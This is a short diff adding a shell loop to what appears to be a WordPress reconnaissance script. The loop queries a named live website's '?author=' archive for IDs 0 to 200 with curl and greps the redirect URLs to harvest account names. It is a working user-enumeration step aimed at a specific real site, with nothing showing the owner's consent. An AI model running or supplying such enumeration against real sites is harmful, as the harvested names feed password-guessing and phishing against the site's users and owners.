@@ -45,7 +45,15 @@ echo ''
 echo ''
 echo "----------- User enumeration via author archive ---------------"
 
+n=0
 
+while (($n<=200)) do
+
+curl -isL https://business-reporter.co.uk/?author=$n | grep -Eo "(https)://[a-zA-Z0-9./?=_%:-]*" | grep "author" |  tee -a
+
+((n++))
+
+done
 
 echo ''
 echo ''
